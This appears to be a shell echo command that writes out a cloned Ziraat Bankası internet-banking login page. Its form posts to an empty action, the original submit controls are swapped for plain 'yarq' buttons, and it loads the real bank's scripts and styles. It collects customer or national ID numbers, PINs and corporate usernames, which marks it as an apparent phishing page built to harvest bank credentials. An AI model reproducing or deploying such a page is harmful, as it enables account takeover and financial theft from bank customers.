echo '
<!DOCTYPE html>
<html class="login">
<head>
    <meta http-equiv="Content-Language" content="tr" />
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-9" />
    <meta name="description" content="" />
    <meta name="keyword" content="" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    

    <link rel="icon" href="/Content/assets/img/touch_icon.png">
    <link rel="apple-touch-icon" href="/Content/assets/img/touch_icon.png">
    <link rel="apple-touch-startup-image" href="https://bireysel.ziraatbank.com.tr/Content/assets/img/ziraat_splash.jpg">
    <meta name="apple-mobile-web-app-title" content="Hoşgeldiniz | Ziraat Bankası İnternet Bankacılığı ">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="mobile-web-app-capable" content="yes">

    <title>Hoşgeldiniz | Ziraat Bankası İnternet Bankacılığı </title>
    
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5, user-scalable=no"/>
<meta name="format-detection" content="telephone=no">
<link href="https://bireysel.ziraatbank.com.tr/plugins.min.css?v=0WnwC10Ui67Cf0vF6vDueNbrbYjKGUAdzIZoal3Akf81" rel="stylesheet"/>


    <script type="text/javascript">
        var relativePath = "/"; 
    </script>
    <noscript>
        <meta http-equiv="refresh" content="0;URL=https://bireysel.ziraatbank.com.tr/CommonPages/JavascriptWarning.aspx" />
    </noscript>
    <link href="https://bireysel.ziraatbank.com.tr/sub.min.css?v=poCm3S8977QiMm67Ewlvu4_GkyZdckcwv64zNJvza9s1" rel="stylesheet"/>

    <script src="https://bireysel.ziraatbank.com.tr/jquery.js?v=QiEygkxoKohmktF9h3R54ew5H4jv158sbGoSX0IkvnU1"></script>


    <script src="https://bireysel.ziraatbank.com.tr/zrtprefs.js?v=VUizWBu_NjyhE2SLwr39ixr9K8zgXNMvP7TR6vt6plw1"></script>

    <script type="text/javascript">
        $(function () {
            try { zrtadx.zrtinitiate(null); } catch (e) { console.log(e); }
        });
    </script>
    
</head>
<body class="login-page">
    
    <!--[if IE 7]>
      <div class="ie-warning-band">
         <p>
            
            
         </p>
      </div>
      <![endif]-->
    <!--[if IE 8]>
      <div class="ie-warning-band">
         <p>
            
            
         </p>
      </div>
      <![endif]-->
    <script language="JavaScript" type="text/javascript">
        var sid = "";
        var is_DefaultSubmit = false;
    </script>
    <!-- scripts -->
    <form name="aspnetForm" method="post" action="" id="aspnetForm" autocomplete="off">
<div>
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
<input type="hidden" name="__VSTATE" id="__VSTATE" value="H4sIAAAAAAAEANVVX2/TMBBX02RdGaPjpeKFtohBh9Q2+yO0sakg2g2G2D91Ew+8VG5yTUwdO9jO2u5j8CngHfH1wE7arWUbD5MYQops3fnu/PvdXXw/U7kHKavQbjcZlZwR0YLPEeZwxIRsIKf3Hobtdj5tlRxJlpcXncUWSIRJCwIIOsD3oemD02uwgfVk2mKfdTCBY+xRJCN+YfZ4bNZkPGQcSbgcK2dlN9Y2XqyvrW48z7l5o6sXIxOvdxZcNz9jpHK5vFGY28UuNCIpGRW+mzeNlD41xltmQRuZJzCQVmbn4O3eu+Nd13WN9ISV9tGBC6bPoWu9/IROkXA4DuVmu+2ycR6WygnuPeZhugvIBV6ulGNJLSzBUH72W3C1xfgVDrMw2xSiSZAQ1kPsMFoNIiGB46pKk8QCB9UAeA/OcMFsPzpuGIZGak0HGwMeSSpqMW3dIxpFtcMGJcKoVzS16/jqBI5STfvMIEfiU0hs3SSp5vlpTqJOFUsISpNm+buTNxuF7D4a7AH1pG/MaXGHOnwYSnCngGsQxRmtysZemQ+Ka4eAr1VziVV6ImwxBcpqHnGMqjzpRdcyJY9UXCMXh5g/pE2CgUq1Oj3ra6qPqcv6NRYCXSrbJxxRoYGrprAPKcEU7G3ooojIGhLh4JUcUFFvgQB5hOlTR5WBqdSfDEOoc0lUWdsdgmivXCmVhVTdK+pDEBXVFIyQDuKJyEHgM6SIxFIfu9Kvr6ysL1d8wJ4v6+ura+VnWyUOqvtpqYuIgC1N+f6Ysuaatb7dCHxy8DoMbxt9XKnZiT44r+4VBc9cVs1f18g6F99vlIs3jHtMNkd5OIj0U/JP0nJB5P/qyPTFS2V2YwYZT+vNRG9cVTJrxPTHNFNfynDTtvv9fu0Mc4RkzWFBTXJbfQ31Jw8FEHubeTxyEW0oRsjBBPfsI+SBsD/GLvHgiNNyO7zHVL5cpiJGXDoKQw/xczZjuRporH8Zph575tREK6aunWbGZDWTuaPe8z/Pm9EQ+AWfRKsNCggAAA==" />
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="" />
</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms["aspnetForm"];
if (!theForm) {
    theForm = document.aspnetForm;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>


<script src="https://bireysel.ziraatbank.com.tr/WebResource.axd?d=SqZa8GYeN-voTRZ-GMsb11KKLzsM4GjYxTGAXg23ajVoLdblDojATKR_7aSBdwvGYc1HUN_gkQjb5mtE0&amp;t=637346894097037378" type="text/javascript"></script>

<script language=javascript>
$(document).keydown(function(e){var t;if(e.keyCode==8){var n=e.srcElement||e.target;if(n.tagName.toUpperCase()=="INPUT"||n.tagName.toUpperCase()=="TEXTAREA"){t=n.readOnly||n.disabled}else t=true}else t=false;if(t)e.preventDefault()})

</script>
<script src="https://bireysel.ziraatbank.com.tr/WebResource.axd?d=agHyoqmM5R2HZK0hGHfDVytXXsb63ddjF_nKao5XovSnHZhjS6or_fp52iypVd59PLxUB0lM_JvLk5XHaiBfD53SBAg1&amp;t=637346894097037378" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
var dd5fcb6461304a64adbfb0462736cb6f=["1024","010001","E3245645008774EB944DBCC08C45265749DDD7432F53D49D898092A539F6E0D4DBF6FEA3B6DAA428B02DBA84066F1AF6440BB2896D04DFAB5E00D9F8771CC9467F1A1D5E71D6D901D49B3A148E7711E8C1AE47B3B7A1EBAA87DF1C925BFE507E92E16CC3989DB66B7CB22D47941C1F8B7B92D21DF8F255F214C926D34C722595"];var dd5fcb6461304a64adbfb0462736cb6f=["1024","010001","E3245645008774EB944DBCC08C45265749DDD7432F53D49D898092A539F6E0D4DBF6FEA3B6DAA428B02DBA84066F1AF6440BB2896D04DFAB5E00D9F8771CC9467F1A1D5E71D6D901D49B3A148E7711E8C1AE47B3B7A1EBAA87DF1C925BFE507E92E16CC3989DB66B7CB22D47941C1F8B7B92D21DF8F255F214C926D34C722595"];function WebForm_OnSubmit() {
if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;EncryptFormInputs();
return true;
}
//]]>
</script>

<div>

    <input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
    <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="wYZRl6Ct/QLTjxxjtCogoGJvkFSrwda8nL63BbED1mY142kphHEL3xOS/50PiAMd0R4P+lQU51LqnUH2LDrv1mjQpJnKMUhrkH8f8VeDhP93nfIjDV2SLUH/kCTKW7niYl1twZa570+xY+M2gFrb3QEfMo5DfxgIY695UAKXfSldqNviDejTGSqaLWKWUWXcNR6RokHHfHaEG4kYlXMltNqbHPYjEYLu9E6JK74jdXirMCaokDRk+G5ZkJDaI1OhPrFtM3OS2aZRcZkyaaaEkVZIdyoAK4zfdcTaYjJ8kWFsL0DNvBBALe6m1L4eAbuALy7HPhHuIyDORCxtHeUXY8cN2MyKimBFOVU/hhY6B6tlu1FfvoAx1bQSSfUpWiEm+rlft9QYbckrpi4q9uq/ZdLLw1hxZgOoygbhEoLYPyIPeXhZI/mYqTjf4xuEIGxzjKQHquNIQSAesECVev59SaPklE/xrX6E16Y/Cg7qosHzFonO81+Xs50JbBY8495j7jMl0Zvzcj9F/q6JMao/4F67nUXgxGgvne/qeD4dDS8vHs4LOQwi9PLVFtbcbKDlZ5OS2dOvcTSwMk+9A3zQ3TH5SzgLsOhGTWuFHj6hf3Jl8H4nZIfilMpyyQfPqbieNw10LPIhhbxIv84B1qzETmA2PiWc0pirxwHuLOgIgzQtNlnT23X8T+mL+ksvdPb/GZFlE85r/4Yjenjrrhc5dknK2HexAPllxKndFAK1tTQripAZyQeL+xrDzknjObyexs61x4gxXyFK5gAD6uV0DyAxZTLk7lWlIbRfkh9b8rN09+g+Rv3eMcMj7Boj+9ZB7WFfLEOiFc4DGB6BZ+9H3XkIxjiwwatBlKLHH1VL567TceTzTcW0fsMCNPcXgZ27IwuehOeRG0DBUDbZy1LgzYRVK+q/9mXw8/WJIbNlms0ia/bnnlnP2CCCP6wvYQRLvCJSRGmYDFqLh8APgNcy5z3uCWKJynIfCIJEu9dKqpOmx+i9UeTw2CjlFrSOuHON95GtF06kCIuHRKN+" />
</div>
        <input type="hidden" name="ctl00$TabInstanceUniqueKey" id="TabInstanceUniqueKey" />
        <script type="text/javascript">
            VeriBranch.CheckTabInstance("/navigationcontroller.aspx?page=Logoff");
        </script>
        
        <input type="hidden" name="ctl00$NavigationHiddenInput" id="NavigationHiddenInput" />
        <input type="hidden" name="ctl00$HdnClientParametersCacheKey" id="HdnClientParametersCacheKey" value="16c3e0a21a8849ef9082cb7c25228e7c" />
        <input type="hidden" name="ctl00$HdnCurrentCulture" id="HdnCurrentCulture" value="tr" />
        <input type="hidden" name="ctl00$HiddenIsIOSDevice" id="HiddenIsIOSDevice" value="False" />
        <input type="hidden" name="ctl00$HdnBaseUrl" id="ctl00_HdnBaseUrl" value="//bireysel.ziraatbank.com.tr" />
        <input type="hidden" name="ctl00$zrt_user_prefs" id="zrt_user_prefs" />
        <input type="hidden" name="ctl00$user_prefs2" id="user_prefs2" />

        <a causesval="false" onclick=";;;" id="NavigationHiddenButton" href="javascript:__doPostBack(&#39;ctl00$NavigationHiddenButton&#39;,&#39;&#39;)" style="display: none;"><span></span></a>
        <div id class="login-wrap">
    
            
<header>
   <div id="ButtonContainer" class="top hidden-xs">
        
      <div id class="container">
            
         <a causesval="false" onclick=";;;" id="ctl00_LoginHeader_SecurityButton" href="javascript:__doPostBack(&#39;ctl00$LoginHeader$SecurityButton&#39;,&#39;&#39;)"><span></span>GÜVENLİK</a>
         <a causesval="false" onclick=";;;" id="ctl00_LoginHeader_HelpButton" href="javascript:__doPostBack(&#39;ctl00$LoginHeader$HelpButton&#39;,&#39;&#39;)"><span></span>YARDIM</a>
         <a causesval="false" onclick=";;;" id="ctl00_LoginHeader_FaqButton" href="javascript:__doPostBack(&#39;ctl00$LoginHeader$FaqButton&#39;,&#39;&#39;)"><span></span>SIKÇA SORULAN SORULAR</a>
         <a causesval="false" onclick="return ($.isFunction(firstLoginWithCulture) ? firstLoginWithCulture() : true);;;;" id="ctl00_LoginHeader_BtnLanguage" href="javascript:__doPostBack(&#39;ctl00$LoginHeader$BtnLanguage&#39;,&#39;&#39;)"><span></span>ENGLISH</a>
      
        </div>
   
    </div>
   <div id class="bottom">
        
      <div id class="container">
            
         <a id="LoginLogoButton" class="logo" href="javascript:__doPostBack(&#39;ctl00$LoginHeader&#39;,&#39;LoginLogoButton&#39;)" causesval="false">
             
            <span id class="clearfix">
               <i id class="icon-logo-ico"></i>
               <i id class="icon-logo-text"></i>
            </span>
         </a>
         <ul id class="contact hidden-xs">
                
            <li id class="call-center">
                <a id="LogoButton" class="icon-musteri-iletisim-merkezi" href="tel:08502200000">
                    
                </a>
       
            </li>
         
            </ul>
      
        </div>
   
    </div>
</header>
            <div id class="bg-layer">
        
            
    </div>
            <div id class="container">
        
            <div id class="tc-kimlik-giris-wrap">
            
               <div id="ctl00_ctl06"  class="row">
                  <div id="ctl00_LoginBoxContainer" class="col-xs-12 col-md-6" >
                     <div id="LoginBox" class="login-box long">
                
                        
    <span id="ctl00_c_PageValidation" style="color:Red;visibility:hidden;"></span>
    <script>
      
        function ValidateIdentity(input) {
            if ($(input).hasClass("from-cookie")) {

            }
            else if ($(input).is(":visible")) {
                var value = $(input).val();
                if (value && value.length > 0) {
                    var regx = new RegExp("^[0-9]+$");
                    if (!regx.test(value)) {
                        return GetValidationMsg($(input), "Müşteri / T.C. Kimlik Numaranızı Yalnızca Rakam Olarak Giriniz");
                    }
                }
                return CheckCustomerNumberTCKN();
            }
        }

        function CheckCustomerNumberTCKN() {
            var field = $("#ctl00_c_RetailIdentityTextBox");
        var customerInput = $("#ctl00_c_RetailIdentityTextBox").val();
            
        if (customerInput.length > 9 && customerInput.length < 11) {
            return "Müşteri / T.C. Kimlik Numaranızı Kontrol Ediniz.";
        }
            
        var reqMsg = field.attr("ReqFieldMsg");
        var haveValue = field.hasClass("have-value");
        var value = haveValue ? field.val() : "";

        if (reqMsg != undefined && value == "") {
            return GetValidationMsg(field, reqMsg);
        }
        var numInputMsg = field.attr("ReqNumMsg");
        if (numInputMsg != undefined && isNaN(value)) {
            return GetValidationMsg(field, numInputMsg);
        }

        var lengthMsg = field.attr("LengthMsg");
        var maxLength = eval(field.attr("ReqMaxLength"));
        if (lengthMsg != undefined && value.length != maxLength) {
            return GetValidationMsg(field, lengthMsg);
        }

        var rangeMsg = field.attr("RangeValidMsg");

        if (rangeMsg != undefined) {
            var rangeType = field.attr("RangeValType");
            var rangeMin = eval(field.attr("RangeMin").replace(/\./g, "").replace(/\,/g, "."));
            var rangeMax = eval(field.attr("RangeMax").replace(/\./g, "").replace(/\,/g, "."));
            var fieldValue = parseFloat(value.replace(/\./g, "").replace(/\,/g, "."));
            if (rangeType == "strln" && (rangeMin > value.length || value.length > rangeMax)) {
                return GetValidationMsg(field, rangeMsg);
            }
            if (rangeType == "num") {
                var hasError = false;

                if ((rangeMin == 0 && fieldValue < 0.01) || (rangeMin != 0 && fieldValue < rangeMin))
                    hasError = true;
                if (rangeMax != 0 && fieldValue > rangeMax)
                    hasError = true;
                if (hasError)
                    return GetValidationMsg(field, rangeMsg);
            }
        }
        }

    </script>
    <input name="rdLng" type="hidden" value="">
    <input type="hidden" name="ctl00$c$CookieEditStatusField" id="ctl00_c_CookieEditStatusField" value="false" />
    <p>İnternet Şubemize Hoş Geldiniz</p>
    <div id class="tabs-wrap" data-module="14">
                    
         
         <div id="TabHeaderContainer" class="tabs tab-header-container">
                        
            <a causesval="false" onclick=";;;" id="ctl00_c_RetailTabHeaderButton" class="active" href="javascript:__doPostBack(&#39;ctl00$c$RetailTabHeaderButton&#39;,&#39;&#39;)"><span></span>BİREYSEL</a>
            <a causesval="false" onclick=";;;" id="ctl00_c_CorporateTabHeaderButton" href="javascript:__doPostBack(&#39;ctl00$c$CorporateTabHeaderButton&#39;,&#39;&#39;)"><span></span>KURUMSAL</a>
         
                    </div>
         
         
         
         <div id class="tab-container tab-contents">
                        
            <div id="RetailTabContainer" class="tab-item active">
                            
               <div id="ctl00_c_RetailIdentityContainer" class="form-group hidden-title">
                  <input autocomplete="off" name="ctl00$c$RetailIdentityTextBox" type="tel" maxlength="11" id="ctl00_c_RetailIdentityTextBox" class="form-control required isNumber numeric external-validation" MaxLengthValidationCharacterCount="0" autocomplete="off" placeholder="T.C. Kimlik / Müşteri Numaranız" data-msg-required="Müşteri / T.C. Kimlik Numaranızı Giriniz." MaxLengthValidationEnabled="False" onpaste=";" ondrop="return DisableDragAndDrop(event);" DisableValidationOnBlur="true" onkeypress=";" onkeydown=";return FcsToCtrl(event,&#39;ctl00_c_RetailLoginButton&#39;);" onkeyup=";;" onmouseup=";" causesval="false" onmousedown=";" Encrypted exvalidmethod="ValidateIdentity" /><input type="hidden" name="ctl00$c$RetailIdentityTextBoxdd5fcb6461304a" id="ctl00_c_RetailIdentityTextBoxdd5fcb6461304a" />
               </div>
               <div id="RetailRememberMeContainer" class="clearfix">
                                
                  <div role="button" class="switch-cont">
                                    <span>Beni Hatırla</span><label class="switch"><input id="ctl00_c_RetailRememberMeCheckBox" type="checkbox" name="ctl00$c$RetailRememberMeCheckBox" causesval="false" /><span class="switch-slider"></span></label>
                                </div>
               
                            </div>
               <div id="ctl00_c_RetailPinContainer" class="form-group hidden-title">
                  <input autocomplete="off" name="ctl00$c$RetailPinTextBox" type="password" maxlength="6" id="ctl00_c_RetailPinTextBox" class="form-control required pin-entry isAlphaNumericForPin external-validation" onmousedown=";" data-rule-range-min="5" placeholder="Şifre" data-msg-required="Lütfen şifrenizi giriniz." onmouseup=";" onpaste="return false;;return false;return false;" ondrop="return DisableDragAndDrop(event);" DisableValidationOnBlur="true" data-rule-range-max="6" onkeypress=";" onkeydown=";return FcsToCtrl(event,&#39;ctl00_c_RetailLoginButton&#39;);" onkeyup=";;" causesval="false" pin-validation-message-current-pin-length="Şifrenizi kontrol ediniz." Encrypted exvalidmethod="CheckAlphaNumericCurrentPinEntry" /><input type="hidden" name="ctl00$c$RetailPinTextBoxdd5fcb6461304a" id="ctl00_c_RetailPinTextBoxdd5fcb6461304a" />
               </div>
               <div id class="clearfix">
                                
                  <div role="button" class="switch-cont">
                                    <span for="ctl00_c_RetailMobileSignatureCheckBox" class="">Mobil İmza İle Giriş<a href="javascript:;" data-toggle="popover" data-original-title="Bu hizmetten sadece Turkcell hatlı bireysel müşterilerimiz yararlanabilir."><i class="icon-aciklama"></i></a></span><label class="switch"><input id="ctl00_c_RetailMobileSignatureCheckBox" type="checkbox" name="ctl00$c$RetailMobileSignatureCheckBox" causesval="false" /><span class="switch-slider"></span></label>
                                </div>
               
                            </div>
                  
               
               <div id class="btns">
                                
<button name="yarq" class="btn btn-danger sendBtn">DEVAM</button>
               
                            </div>
                   <a causesval="true" onclick="window.open(&#39;/Transactions/Online/Default.aspx?txns=ResetPin&amp;customerType=rtl&#39;,&#39;_blank&#39;, &#39;status=yes,scrollbars=yes,resizable=yes,width=1170,height=723&#39;); return false;;;;" id="ctl00_c_RetailRemindPinButton" class="custom-link" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$c$RetailRemindPinButton&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, true))"><span></span>Şifremi Unuttum</a>
               <div id class="tab-footer">
                                
                  <p>Dijital Bankacılık müşterimiz olmak için</p>
                  <a causesval="true" onclick="window.open(&#39;/Transactions/Online/Default.aspx?txns=OnlineApp&amp;customerType=rtl&#39;,&#39;_blank&#39;, &#39;status=yes,scrollbars=yes,resizable=yes,width=1170,height=723&#39;); return false;;;;" id="ctl00_c_OnlineApplicationButton" class="btn btn-default " href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$c$OnlineApplicationButton&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, true))"><span></span>HEMEN BAŞVUR</a>
               
                            </div>
            
                        </div>
            <div id="CorporateTabContainer" class="tab-item">
                            
               <div id="ctl00_c_ctl19" class="form-group hidden-title">
                  <input autocomplete="off" name="ctl00$c$CorporateIdentityTextBox" type="tel" maxlength="9" id="ctl00_c_CorporateIdentityTextBox" class="form-control required isNumber numeric external-validation" MaxLengthValidationCharacterCount="0" autocomplete="off" placeholder="Müşteri Numaranız" data-msg-required="Müşteri Numaranızı Giriniz" MaxLengthValidationEnabled="False" onpaste=";" ondrop="return DisableDragAndDrop(event);" DisableValidationOnBlur="true" onkeypress=";" onkeydown=";" onkeyup=";;" onmouseup=";" causesval="false" onmousedown=";" Encrypted exvalidmethod="ValidateIdentity" /><input type="hidden" name="ctl00$c$CorporateIdentityTextBoxdd5fcb6461304a" id="ctl00_c_CorporateIdentityTextBoxdd5fcb6461304a" />
               </div>
               <div id="CorporateRememberMeContainer" class="clearfix">
                                
                  <div role="button" class="switch-cont">
                                    <span>Beni Hatırla</span><label class="switch"><input id="ctl00_c_CorporateRememberMeCheckBox" type="checkbox" name="ctl00$c$CorporateRememberMeCheckBox" causesval="false" /><span class="switch-slider"></span></label>
                                </div>
                  
               
                            </div>
               <div id="ctl00_c_ctl20" class="form-group hidden-title">
                  <input autocomplete="off" name="ctl00$c$CorporatePinTextBox" type="password" maxlength="6" id="ctl00_c_CorporatePinTextBox" class="form-control required pin-entry isAlphaNumericForPin external-validation" onmousedown=";" data-rule-range-min="5" placeholder="Şifre" data-msg-required="Lütfen şifrenizi giriniz." onmouseup=";" onpaste="return false;;return false;return false;" ondrop="return DisableDragAndDrop(event);" DisableValidationOnBlur="true" data-rule-range-max="6" onkeypress=";" onkeydown=";return FcsToCtrl(event,&#39;ctl00_c_CorporateLoginButton&#39;);" onkeyup=";;" causesval="false" pin-validation-message-current-pin-length="Şifrenizi kontrol ediniz." Encrypted exvalidmethod="CheckAlphaNumericCurrentPinEntry" /><input type="hidden" name="ctl00$c$CorporatePinTextBoxdd5fcb6461304a" id="ctl00_c_CorporatePinTextBoxdd5fcb6461304a" />
               </div>
               <div id="ctl00_c_ctl21" class="form-group hidden-title">
                  <input autocomplete="off" name="ctl00$c$CorporateUserNameTextBox" type="text" maxlength="10" id="ctl00_c_CorporateUserNameTextBox" class="form-control required" MaxLengthValidationCharacterCount="0" autocomplete="off" placeholder="Kullanıcı Adınız" MaxLengthValidationEnabled="False" onpaste=";" ondrop="return DisableDragAndDrop(event);" onkeypress=";" onkeydown=";return FcsToCtrl(event,&#39;ctl00_c_CorporateLoginButton&#39;);" onkeyup=";;" onmouseup=";" causesval="false" onmousedown=";" Encrypted /><input type="hidden" name="ctl00$c$CorporateUserNameTextBoxdd5fcb6461304a" id="ctl00_c_CorporateUserNameTextBoxdd5fcb6461304a" />
               </div>
                 
               <div id class="btns">
                                
<button name="yarq" class="btn btn-danger sendBtn">DEVAM</button>
               
                            </div>
                   <div id class="clearfix">
                                
                       <div id="ctl00_c_ctl28"  class="row">
                           <div id="ctl00_c_ctl29" class="col-xs-7" >
                               <a causesval="true" onclick="window.open(&#39;/Transactions/Online/Default.aspx?txns=ForgotCustomerNumber&amp;customerType=rtl&#39;,&#39;_blank&#39;, &#39;status=yes,scrollbars=yes,resizable=yes,width=1170,height=723&#39;); return false;;;;" id="ctl00_c_CorporateRemindCustomerNumberButton" class="custom-link text-left" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$c$CorporateRemindCustomerNumberButton&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, true))"><span></span>Müşteri Numaramı Unuttum</a>
                           </div>
                           <div id="ctl00_c_ctl30" class="col-xs-5" >
                               <a causesval="true" onclick="window.open(&#39;/Transactions/Online/Default.aspx?txns=ResetPin&amp;customerType=rtl&#39;,&#39;_blank&#39;, &#39;status=yes,scrollbars=yes,resizable=yes,width=1170,height=723&#39;); return false;;;;" id="ctl00_c_CorporateRemindPinButton" class="custom-link pull-right" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$c$CorporateRemindPinButton&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, true))"><span></span>Şifremi Unuttum</a>
                           </div>
                       </div>
               
                            </div>
            
                        </div>
         
                    </div>
    
                </div>
    <div id class="">
                    
        <div id="ctl00_c_LbSMSOption" class="modal fade custom-modal-view" role="modal" >
<div class="modal-dialog ">
   <!-- Modal content-->
   <div class="modal-content">
      <div class="modal-header">
                             <h4 class="modal-title"></h4>
                             <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <i class="icon-basarisiz"></i>
                 </button>
                            </div>
           <div class="modal-body">
                                     <div>
    
                         Ziraat Onay kullanmaya devam etmek için uygulamamızın son sürümünü yükleyerek tekrar Ziraat Onay aktivasyonu yapmanız gerekmektedir. Geçici olarak SMS doğrulama ile giriş yapabilirsiniz.
            
</div>
                           </div>
             <div class="modal-footer ">
            <div>
    
                <div id="ctl00_c_LbSMSOption_ctl03"  class="row">
                    
                    <div id="ctl00_c_LbSMSOption_ctl04" class="col-xs-6 col-sm-6 col-md-6 col-lg-6" >
                          <a causesval="false" onclick="CloseSMSOptionLb();return false;;;;;" id="ctl00_c_LbSMSOption_BtnClose" class="btn btn-default " href="javascript:__doPostBack(&#39;ctl00$c$LbSMSOption$BtnClose&#39;,&#39;&#39;)"><span></span>İPTAL</a>
                    </div>
                    <div id="ctl00_c_LbSMSOption_ctl05" class="col-xs-6 col-sm-6 col-md-6 col-lg-6" >
                        <a causesval="false" onclick=";;;" id="ctl00_c_LbSMSOption_BtnOK" class="btn btn-danger " href="javascript:__doPostBack(&#39;ctl00$c$LbSMSOption$BtnOK&#39;,&#39;&#39;)"><span></span>TAMAM</a>
                    </div>
                </div>
            
</div>
       
   </div>
</div>
</div>
</div>

    
                </div>
    <div class="logout-wrap unsupported-browser none" style="margin-top: 177px;">
        <i class="icon-logo-ico"></i>
        <h1 id class="">
                    
         Kullanmakta olduğunuz tarayıcı Yeni İnternet Şubemizin bazı özelliklerini desteklememektedir.
        
                </h1>
    </div>

    <style>
        .api-payment-container img { max-height: 92px; max-width: 92px; }
    </style>
    <script type="text/javascript">
        function RestorePlaceholder() {

            $.each($("input[type=text][placeholder],input[type=tel][placeholder], input[type=password][placeholder]"), function () {
                var $input = $(this);
                if (!$input.is(":focus") && $input.val().length == 0) {
                    $input.prev("span.placeholder").css("display", "block");
                }
            });

        }
        $(document).ready(function () {
            $("input[type=text], input[type=tel]").keypress(function (e) {
                if (e.which == 13) {
                    loginSubmit();
                    e.preventDefault();
                    return false;
                }
            });
            setTimeout(function () {
                var rememberMe = $("#ctl00_c_RetailRememberMeCheckBox");
                if (rememberMe.is(":visible") && rememberMe.is(":checked")) {
                    rememberMe.on("change", function () {
                        if (!rememberMe.is(":checked")) {
                            //removeCookies();
                            $("input[type=text].from-cookie, input[type=tel].from-cookie").val("");

                            RestorePlaceholder();
                            if (!VeriBranch.IsMobileDevice())
                                $(identity[0]).focus();
                        }
                    });
                }
            }, 100);
            var cookieInputs = $("input[type=text].from-cookie, input[type=tel].from-cookie");
            cookieInputs.on("paste keypress input", function (event) {
                var $this = $(this);
                if ($this.hasClass("from-cookie")) {
                    //rememberMe.removeAttr("checked");
                    //removeCookies();
                    if ($this.hasClass("keepCookies")) {
                        $this.val("");
                        RestorePlaceholder();
                    }
                    else {
                        $("input[type=text].from-cookie, input[type=tel].from-cookie").val("");

                        RestorePlaceholder();
                        $("#ctl00_c_CookieEditStatusField").val("true");
                    }
                }
                if ($this.hasClass("keepCookies")) {
                    $this.removeClass("from-cookie");
                }
                else {
                    cookieInputs.removeClass("from-cookie");
                }
            });


            var identity = $("#ctl00_c_RetailIdentityTextBox");
            var pin = $("#ctl00_c_RetailPinTextBox");

            identity.bind("contextmenu", function (e) {
                return false;
            });
            pin.bind("contextmenu", function (e) {
                return false;
            });



            setTimeout(function () {
                var hasCookie = Cookies.get("RetailZTLoginCookie") != undefined;
                var $identity = $(identity[0]);
                var hasIdentity = $identity.val() != "" && ($identity.attr("placeholder") != $identity.val());
                if ($identity.val().length > 0 && (hasCookie || hasIdentity)) {
                    $(pin[0]).focus();
                }
                else {
                    $identity.focus();
                }
            }, 100);

        });
        function removeCookies() {
            Cookies.remove("RetailZTLoginCookie");
            Cookies.remove("RetailZTLoginCookie", { path: "" });
        }
        function setIdentity(clientId, identityValue) {
            $("#" + clientId).val(identityValue);
        }

        function ValidatePage(sender, args) {
            ShowLoginLoading();
        }
        function loginDummyLoading() {
            var $loadingPanel = $(".loadingPanel");
            if ($loadingPanel.is(":visible")) {
                return;
            }
            $loadingPanel.show();
            $(".preloader-box1").show();
        }


    </script>
    <input type="hidden" name="ctl00$c$HiddenField1" id="ctl00_c_HiddenField1" value="15" />

                     
            </div>
                  </div>
                  <div id="ctl00_LoginInfoBoxContainer" class="col-xs-12 col-md-6" >
                     <a id="TRIDCardLoginButton" class="tckk-giris-btn" href="TRIDCardLogin.aspx">
    <i id class="icon-TCK">
        <span class="path1"></span><span class="path2"></span>
    </i>
    T.C. KİMLİK KARTI İLE GİRİŞ
</a>

<a style="display:none;" href="javascipt:;" class="e-imza-indir-btn"><i class="icon-e-imza-indir"><span class="path1"></span><span class="path2"></span></i><strong>E-İMZA</strong> UYGULAMASINI İNDİRİN</a>
<div id="LoginInfoBoxContainer" class="login-info-box" data-module="15">
                
   
   <div id class="body">
                    
      <div id class="banner slider login-banner">
                        
          <div id class="item">
                            
         <img src="../../Content/assets/img/phone.png" style="border-width:0px;" />
         <p>Mobil uygulamamız ile<br/>Ziraat Bankası hep yanınızda!</p>
         <a causesval="false" onclick="window.open(&#39;http://www.ziraat.com.tr/tr/Bireysel/DogrudanBankacilik/Pages/ZiraatMobil.aspx&#39;,&#39;_blank&#39;, &#39;status=yes,scrollbars=yes,resizable=yes,width=1170,height=723&#39;); return false;;;;" id="ctl00_LoginInfoBox_DownloadMobileAppButton1" class="btn btn-default " href="javascript:__doPostBack(&#39;ctl00$LoginInfoBox$DownloadMobileAppButton1&#39;,&#39;&#39;)"><span></span>HEMEN YÜKLE</a>
              
                        </div>
           <div id class="item">
                            
         <img src="../../Content/assets/img/login/phone.png" style="border-width:0px;" />
         <p>Mobil uygulamamız ile<br/>Ziraat Bankası hep yanınızda!</p>
         <a causesval="false" onclick="window.open(&#39;https://www.bankkart.com.tr/bankkart-mobil&#39;,&#39;_blank&#39;, &#39;status=yes,scrollbars=yes,resizable=yes,width=1170,height=723&#39;); return false;;;;" id="ctl00_LoginInfoBox_DownloadMobileAppButton2" class="btn btn-default " href="javascript:__doPostBack(&#39;ctl00$LoginInfoBox$DownloadMobileAppButton2&#39;,&#39;&#39;)"><span></span>HEMEN YÜKLE</a>
              
                        </div>
      
                    </div>
